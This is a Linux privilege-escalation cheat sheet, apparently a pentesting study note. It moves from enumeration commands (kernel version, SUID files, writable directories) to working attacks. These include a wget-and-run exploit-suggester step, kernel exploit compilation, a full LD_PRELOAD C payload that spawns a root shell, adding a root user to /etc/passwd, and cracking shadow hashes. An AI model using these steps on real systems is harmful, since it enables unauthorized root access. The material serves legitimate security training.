# Linux Privilege Escalation Enumeration

## Basic Enumeration

- **`cat /etc/os-release`**  
  To identify the OS version and check if it is vulnerable.

- **`echo $PATH`**  
  To view the current PATH variable. You can add a new path to execute commands using:  
  `export PATH=$PATH:New_Path`

- **`env`**  
  To list the environment variables of the Linux machine.

---

## Kernel Exploit

- **`cat /proc/version`**  
  To determine the kernel version.

- **`uname -a`**  
  To get detailed information about the kernel version.

- **`lscpu`**  
  To gather more information about the CPU.

- **`cat /etc/shells`**  
  To list available shells on the system.

---

## Permissions

### SUID and SGID Bits
- **Setuid (SUID)**:  
  When set, files will execute with the privileges of their owner.

- **Setgid (SGID)**:  
  When set, files will execute with the privileges of their group. If set on a directory, files created within that directory will inherit the group of the directory itself.

### File Permissions
- The format `-rwxrwxrwx`:  
  - The first `rwx` is for the owner.  
  - The second `rwx` is for the group.  
  - The third `rwx` is for others.

- SUID/SGID permissions are represented by an `'s'` in the execute position.  

### SETUID and SETGID Permissions
Binaries with these permissions allow a user to run a command as root without granting root-level access directly. For example:
```
ahmed💀ahmed:~$ ls -lah /bin/passwd
-rwsr-xr-x 1 root root 116K Dec 6 07:51 /bin/passwd
```
The letter `s` in place of `x` indicates that anyone can read, write, and execute with all permissions as the owner.

---

## Finding Files and Directories

### Find All Files with SETUID Permissions
Use:
```
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```

#### Explanation:
- **`find /`:** Starts searching from the root directory (`/`) and includes all subdirectories.
- **`-perm -4000`:** Matches files with the SUID (Set User ID) bit set, allowing execution with the file owner's permissions.
- **`-o`:** Logical OR operator.
- **`-perm -2000`:** Matches files with SGID (Set Group ID) bit set, allowing execution with group permissions.
- **`-type f`:** Restricts search to regular files only.
- **`2>/dev/null`:** Silences error messages (e.g., "Permission denied").

---

### Find All Writable Directories
Use:
```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

#### Explanation:
- **`find /`:** Starts searching from the root directory (`/`) and includes all subdirectories.
- **`-path /proc`:** Specifies `/proc`, a virtual filesystem, to exclude from the search.
- **`-prune`:** Prevents descending into `/proc`.
- **`-o`:** Logical OR operator.
- **`-type d`:** Restricts search to directories only.
- **`-perm -o+w`:** Matches directories that are world-writable (writable by any user).
- **`2>/dev/null`:** Silences error messages (e.g., "Permission denied").

---

## Managing SUID Permissions

### Set SUID Bit
Use:
```
chmod u+s filename
```

### Remove SUID Bit
Use:
```
chmod u-s filename
```

---

## Groups and Users

To find groups and users in those groups, use:
```
cat /etc/group
```

To find users in a specific group:
```
getent group sudo   # Replace "sudo" with your group name
```
Example output:
```
sudo:x:27:ahmed
```

---

## Kernel Exploits

### Exploit Example Using GCC
1. Use `uname -a` to find kernel details.
2. Search for an exploit online matching your kernel version.
3. Compile a C exploit file using:
   ```
   gcc filename.c -o filename && chmod +x filename && ./filename
   ```
4. Run it to escalate privileges.

### Using Linux Exploit Suggester
Download and run Linux Exploit Suggester:
```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x ./les.sh && ./les.sh
```
Example output:
```
Kernel version: 6.12.13
Architecture: x86_64

Possible Exploits:

[+] [CVE-2022-2586] nft_object UAF
    Details: https://www.openwall.com/lists/oss-security/2022/08/29/5

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
    Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
```

---

## Shared Libraries Exploitation

If `sudo -l` reveals `env_keep+=LD_PRELOAD`, you can exploit shared libraries.

1. Check shared libraries for a binary using:
   ```
   ldd /usr/bin/openssl   # Replace with your binary path.
   ```
2. Create an exploit file (`exploit.c`) like this:
   ```
   #include 
   #include 
   #include 
   #include 

   void _init() {
       unsetenv("LD_PRELOAD");
       setgid(0);
       setuid(0);
       system("/bin/bash");
   }
   ```
3. Compile it as a shared library:
   ```
   gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
   ```
4. Execute it using:
   ```
   sudo LD_PRELOAD=/path/to/exploit.so openssl
   ```

---

## Using `/etc/passwd`

1. Check `/etc/passwd` for writable permissions:
   ```
   ls -lah /etc/passwd 
   ```
2. Generate a password hash using OpenSSL:
   ```
   openssl passwd 12345    # Replace "12345" with your password.
   ```
3. Edit `/etc/passwd`, replacing `x` in `root:x:` with your hash or adding a new user entry like this:
   ```
   newuser:$1$oEIT0M6j$sludhsYV1KW0pLn1tRIt61:0:0::/root:/bin/bash
   ```

Alternatively, if `/etc/shadow` is readable, extract hashes and crack them using tools like Hashcat or John.

To create a password hash for `/etc/shadow`, use:
```
mkpasswd -m sha-512 newpassword    # SHA-512 is commonly used in `/etc/shadow`.
```
```
